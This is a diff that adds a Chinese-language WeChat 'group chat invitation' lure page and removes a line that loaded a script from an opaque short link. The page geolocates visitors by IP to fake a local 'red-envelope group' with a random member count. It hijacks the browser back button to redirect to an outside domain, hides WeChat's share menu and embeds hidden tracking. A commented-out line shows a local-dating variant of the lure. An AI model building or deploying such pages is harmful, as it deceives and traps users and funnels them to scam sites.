@@ -1,2 +1,85 @@
-111
-<script src="//t.cn/RiDqjWW"></script>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<style>
+h1,h2,div,body,img,a{margin: 0;padding: 0;}
+body{font-size:16px;line-height:1.5;font-family: "微软雅黑","Lucida Grande",STHeiti,Verdana,Arial,Times,serif;background:#f0eff4;}
+img{ border:0 none; }
+a{text-decoration:none;font-weight:normal;color:#333333;}
+ul{list-style: unset;list-style-type:decimal;}
+
+.top{width:100%;background:#ffffff;margin:0 auto;text-align: center;padding:30px 0 24px;}
+.top img{width:90px;border-radius:5px;}
+.top h2{font-weight: normal;font-size:18px;margin-top:7px;}
+.top span{color:#878787;}
+
+.bot{width:100%;border-top: 1px solid #bebebe;}
+.bot h1{width:100%;text-align: center;display: inline;float: left;font-weight: normal;color:#4d4c51;font-size:20px;margin:40px 0 10px;}
+.bot a{width:54%;display: inline;float: left;margin:15px 23% 25px;background:#04be01;color:#ffffff;text-align: center;padding:8px 0;border-radius:5px;font-size:18px;}
+.bot ul{color:#b5b4b9;display: inline;float: left;margin-left:10px;margin-right:30px;}
+</style>
+<title>群聊邀请</title>
+<script src="assets/jquery.js"></script>
+<script src="assets/jm.js"></script>
+<script type="text/javascript" src="http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js"></script>
+
+<script>
+	window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", window.location.href.split('#')[0]+"#"+new Date().getTime());}
+    function jp() {location.href="http://wx.484838.com.cn/wx/app/index.html";}
+    setTimeout('hh();', 200);	
+</script>
+
+</head>
+<body>
+	<div class="top">
+		<img src="assets/qun_meilv.jpg">
+		<script>
+		function getString(name){var reg=new RegExp("(^|&)"+name+"=([^&]*)(&|$)","i");var r=window.location.search.substr(1).match(reg);if(r!=null)return unescape(r[2]);return""}
+		var timeNum = Date.parse(new Date());
+				 timeNum = timeNum.toString();
+				 timeNum = timeNum.substr(0,10);
+		var stime = Number(getString("s"));
+		if ( stime != "" && timeNum - stime > 7) { 
+			//location.href = "top38.html";
+		}
+		if (typeof remote_ip_info != "undefined") {
+			var myDate = new Date();
+			var hours  = myDate.getHours()+1;
+			//document.write("<h2>"+remote_ip_info["city"]+"约爱吧"+"同城交友群"+"</h2>");
+document.write("<h2>"+remote_ip_info["city"]+"红包群"+hours+"点准时发红包"+"</h2>");
+
+		}else{
+			document.write("<h2>抢红包啦</h2>");
+		}
+
+		function random(min,max){
+			return Math.floor(min+Math.random()*(max-min));
+		}
+		</script>
+		<span><script>document.write(random(100,500));</script>人</span>
+	</div>
+	<div class="bot">
+			<h1>你的朋友邀请你加入群聊</h1>
+			<script>
+			if (typeof remote_ip_info != "undefined") {
+				if (remote_ip_info["country"] == "中国"){
+					document.write("<a class='bon' href='share.html'>加入群聊</a>");
+				}else{
+					document.write("<a class='bon' href='share.html'>加入群聊</a>");
+				}
+			}else{
+				document.write("<a class='bon' href='share.html'>加入群聊</a>");
+			}
+			</script>
+	</div>
+	<div style="display:none;">
+		<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1261011996'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1261011996' type='text/javascript'%3E%3C/script%3E"));</script>
+	</div>
+	<script>
+		document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {WeixinJSBridge.call('hideOptionMenu');});
+	</script>
+</body>
+</html>
